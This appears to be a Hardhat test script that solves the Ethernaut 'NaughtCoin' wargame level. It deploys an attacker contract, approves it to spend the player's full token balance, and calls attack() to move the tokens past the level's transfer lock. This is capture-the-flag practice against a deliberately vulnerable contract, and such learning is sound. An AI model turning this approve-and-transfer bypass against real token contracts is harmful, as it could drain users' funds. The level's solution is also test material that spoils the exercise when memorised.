import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther,
         logEvents, dumpStorage } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`NaughtCoin`);
  const challengeAddress = await createChallenge(
    `0x096bb5e93a204BfD701502EB6EF266a950217218`
    // IMPORTANT: Some contracts will need a second argument specifying how
    // much value that should have in them on creation. e.g. Reentrance level e.g.
    // , ethers.utils.parseEither("0.001")
  );

  challenge = await challengeFactory.attach(challengeAddress);

  const eoaAddress = await eoa.getAddress();

  const attackerFactory = await ethers.getContractFactory(`NaughtCoinAttacker`);
  attacker = await attackerFactory.deploy(challenge.address, eoaAddress);
});

it("solves the challenge", async function () {
    const addr = await eoa.getAddress();

    // Approve attacker to spend my tokens
    await challenge.approve(attacker.address, await challenge.balanceOf(addr));

    tx = await attacker.attack();
    const receipt = await tx.wait();
    console.log(await challenge.balanceOf(addr));
});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
